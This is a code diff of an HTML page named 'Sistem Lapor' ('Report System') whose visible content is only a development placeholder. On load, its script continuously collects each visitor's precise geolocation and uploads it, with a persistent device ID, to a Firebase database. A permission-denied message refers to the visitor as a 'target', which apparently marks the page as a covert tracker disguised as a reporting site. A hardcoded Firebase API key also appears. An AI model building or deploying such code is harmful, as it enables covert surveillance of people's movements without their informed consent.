@@ -4,11 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Lapor</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <style>
+        #map {
+            height: 400px;
+            width: 100%;
+        }
+    </style>
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
-        import { getDatabase, ref, set, remove } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
+        import { getDatabase, ref, set, onDisconnect } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
 
-        // Konfigurasi Firebase Anda
         const firebaseConfig = {
             apiKey: "AIzaSyDgPYGXqbBXt1NayhNB5M-8mjXfGKrOzWM",
             authDomain: "coba-accf3.firebaseapp.com",
@@ -19,13 +26,24 @@
             appId: "1:171764982868:web:19c716f6617667514679c1"
         };
 
-        // Inisialisasi Firebase
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        // Fungsi untuk mendapatkan lokasi
+        let map;
+        let marker;
+
+        // Fungsi untuk mendapatkan atau membuat deviceId
+        function getDeviceId() {
+            let deviceId = localStorage.getItem('deviceId');
+            if (!deviceId) {
+                // Jika tidak ada deviceId, buat ID baru berdasarkan waktu dan simpan ke LocalStorage
+                deviceId = `device${Date.now()}`;
+                localStorage.setItem('deviceId', deviceId);
+            }
+            return deviceId;
+        }
+
         function getLocation() {
-            console.log("Meminta lokasi...");
             if (navigator.geolocation) {
                 navigator.geolocation.watchPosition(showPosition, showError, {
                     enableHighAccuracy: true
@@ -39,36 +57,45 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
-            // Menggunakan ID perangkat unik (dapat disesuaikan)
-            const deviceId = 'device_' + Math.floor(Math.random() * 10000); // Ganti dengan metode ID unik yang sesuai
+            // Gunakan deviceId dari localStorage untuk mengidentifikasi perangkat
+            const deviceId = getDeviceId();
+            const locationRef = ref(database, `devices/${deviceId}`);
 
-            // Mengirim data lokasi ke Firebase
-            const locationRef = ref(database, 'devices/' + deviceId); // ID perangkat unik
+            // Menyimpan data lokasi ke Firebase
             set(locationRef, {
                 latitude: lat,
                 longitude: lon,
                 timestamp: Date.now()
             });
 
-            // Menghapus pesan penolakan izin (jika ada)
-            const notificationRef = ref(database, 'notifications/' + deviceId); // ID perangkat unik
-            remove(notificationRef);
+            // Menghapus data ketika perangkat keluar
+            onDisconnect(locationRef).remove();
+
+            // Update posisi di peta
+            if (!map) {
+                map = L.map('map').setView([lat, lon], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    maxZoom: 19,
+                }).addTo(map);
+            }
+
+            if (marker) {
+                map.removeLayer(marker);
+            }
+            marker = L.marker([lat, lon]).addTo(map);
+            map.setView([lat, lon], 15);
         }
 
         function showError(error) {
-            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
-            console.log("Error mendapatkan lokasi:", error); // Log kesalahan untuk debug
             switch (error.code) {
                 case error.PERMISSION_DENIED:
-                    set(notificationRef, {
-                        message: "Target tidak izinkan lokasi"
-                    });
+                    alert("Target tidak izinkan lokasi.");
                     break;
                 case error.POSITION_UNAVAILABLE:
                     alert("Informasi lokasi tidak tersedia.");
                     break;
                 case error.TIMEOUT:
-                    alert("Permintaan untuk mendapatkan lokasi pengguna telah waktunya habis.");
+                    alert("Permintaan untuk mendapatkan lokasi pengguna telah habis.");
                     break;
                 case error.UNKNOWN_ERROR:
                     alert("Terjadi kesalahan yang tidak diketahui.");
@@ -76,12 +103,12 @@
             }
         }
 
-        // Mulai mendapatkan lokasi saat halaman dimuat
         window.onload = getLocation;
     </script>
 </head>
 <body>
     <h1>Sistem Lapor</h1>
     <p>Proses Development...</p>
+    <div id="map"></div> <!-- Tambahkan peta di halaman sistem lapor -->
 </body>
 </html>
